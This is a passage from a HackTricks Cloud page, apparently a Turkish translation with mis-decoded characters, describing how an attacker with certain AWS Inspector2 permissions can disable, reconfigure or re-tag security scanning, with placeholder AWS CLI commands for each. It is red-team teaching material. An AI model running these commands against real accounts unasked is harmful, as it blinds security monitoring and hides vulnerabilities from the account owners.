`inspector2:Disable` iznine sahip bir saldÄ±rgan, belirli hesaplar Ã¼zerindeki belirli kaynak tÃ¼rleri (EC2, ECR, Lambda, Lambda kodu) iÃ§in gÃ¼venlik taramalarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir, bu da AWS ortamÄ±nÄ±n bazÄ± kÄ±sÄ±mlarÄ±nÄ±n izlenmeden kalmasÄ±na ve saldÄ±rÄ±lara karÅŸÄ± savunmasÄ±z hale gelmesine neden olur. AyrÄ±ca, **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`** izinlerine sahip olarak, bir saldÄ±rgan ÅŸÃ¼pheli yapÄ±landÄ±rmalarÄ±n tespit edilmesini Ã¶nlemek iÃ§in taramalarÄ± seÃ§ici olarak yeniden etkinleÅŸtirebilir.

{% hint style="warning" %}
Bu iÅŸlem, yetkilendirilmiÅŸ bir yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmelidir.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **Potansiyel Etki**: GÃ¼venlik izleme alanÄ±nda kÃ¶r noktalarÄ±n oluÅŸumu.

#### `inspector2:UpdateOrganizationConfiguration`

Bu izne sahip bir saldÄ±rgan, Amazon Inspector organizasyonunuzun yapÄ±landÄ±rmalarÄ±nÄ± gÃ¼ncelleyebilir ve bu da yeni Ã¼ye hesaplar iÃ§in etkinleÅŸtirilen varsayÄ±lan tarama Ã¶zelliklerini etkileyebilir.

{% hint style="warning" %}
Bu iÅŸlem, yetkilendirilmiÅŸ yÃ¶netici tarafÄ±ndan gerÃ§ekleÅŸtirilmelidir.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **Potansiyel Etki**: Organizasyon iÃ§in gÃ¼venlik tarama politikalarÄ±nÄ± ve yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirmek.

#### `inspector2:TagResource`, `inspector2:UntagResource`

Bir saldÄ±rgan, gÃ¼venlik deÄŸerlendirmelerini dÃ¼zenlemek, izlemek ve otomatikleÅŸtirmek iÃ§in kritik olan AWS Inspector kaynaklarÄ±ndaki etiketleri manipÃ¼le edebilir. Etiketleri deÄŸiÅŸtirerek veya kaldÄ±rarak, bir saldÄ±rgan gÃ¼venlik taramalarÄ±ndan zafiyetleri gizleyebilir, uyum raporlamasÄ±nÄ± bozabilir ve otomatik dÃ¼zeltme sÃ¼reÃ§lerine mÃ¼dahale edebilir, bu da kontrolsÃ¼z gÃ¼venlik sorunlarÄ±na ve sistem bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼n tehlikeye girmesine yol aÃ§abilir.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potansiyel Etki**: GÃ¼venlik aÃ§Ä±klarÄ±nÄ±n gizlenmesi, uyum raporlamasÄ±nÄ±n kesintiye uÄŸramasÄ±, gÃ¼venlik otomasyonunun kesintiye uÄŸramasÄ± ve maliyet tahsisinin kesintiye uÄŸramasÄ±.

## Referanslar

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>
{% endhint %}
